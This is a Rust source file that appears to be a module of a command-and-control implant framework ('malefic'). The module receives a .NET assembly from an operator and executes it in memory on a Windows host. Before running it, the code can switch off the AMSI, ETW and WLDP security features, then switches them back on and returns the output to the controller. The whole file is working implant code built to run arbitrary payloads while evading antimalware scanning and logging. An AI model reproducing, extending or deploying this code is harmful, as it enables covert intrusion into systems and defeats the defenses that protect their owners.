use crate::{check_request, Module, Result, TaskResult};
use async_trait::async_trait;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::BinaryResponse;
use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, bypass_wldp, enable_amsi, enable_etw, enable_wldp};
use malefic_helper::win::kit::clr::exec_assemble_in_memory;
use malefic_trait::module_impl;


pub struct ExecuteAssembly {}

#[async_trait]
#[module_impl("execute_assembly")]
impl Module for ExecuteAssembly {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let amsi_bypass = request.param.contains_key("bypass_amsi");
        let etw_bypass = request.param.contains_key("bypass_etw");
        let wldp_bypass = request.param.contains_key("bypass_wldp");

        let bin = request.bin;
        let result: Vec<u8>;
        unsafe {
            if amsi_bypass {
                bypass_amsi();
            }
            if etw_bypass {
                bypass_etw();
            }
            if wldp_bypass {
                bypass_wldp();
            }
            let ret = exec_assemble_in_memory(&bin, request.args);
            result = ret.as_bytes().to_vec();
            if amsi_bypass {
                enable_amsi();
            }
            if etw_bypass {
                enable_etw();
            }
            if wldp_bypass {
                enable_wldp();
            }
        }

        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
            status: 0,
            message: Vec::new(),
            data: result,
            err: "".to_string(),
        })))
    }
}